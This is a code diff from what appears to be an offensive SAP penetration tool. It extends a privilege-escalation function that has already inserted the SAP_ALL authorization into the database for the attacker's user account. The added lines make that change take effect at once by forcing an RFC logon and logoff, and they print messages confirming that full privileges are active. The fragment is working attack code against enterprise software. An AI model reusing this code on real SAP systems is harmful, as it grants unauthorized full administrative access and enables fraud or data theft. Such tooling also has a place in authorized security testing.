@@ -413,6 +413,24 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
                 {"get": "state/ur"},
             ])
 
+    # Force the SAP authorization buffer to refresh by doing an RFC
+    # logon+logoff.  The kernel re-reads the user's authorizations from
+    # the DB on each new logon; this makes the newly inserted SAP_ALL
+    # effective immediately for subsequent RFC calls.
+    print(f"[*] Refreshing authorization buffer (RFC logon/logoff)...")
+    try:
+        import sapmap_rfc
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            conn.call_raw(
+                'RFC_PING',
+                conn._make_func_desc('RFC_PING', []),
+            )
+        print(f"[+] Buffer refreshed — SAP_ALL is now active")
+    except Exception as e:
+        logger.debug(f"Buffer refresh RFC logon failed: {e}")
+        print(f"[!] Buffer refresh logon failed: {str(e).split(chr(10))[0]}")
+        print(f"[!] SAP_ALL is in the DB but may need a manual re-logon to activate")
+
     print(f"[+] SAP_ALL assigned to {creds.username} via database INSERTs")
     return True
 
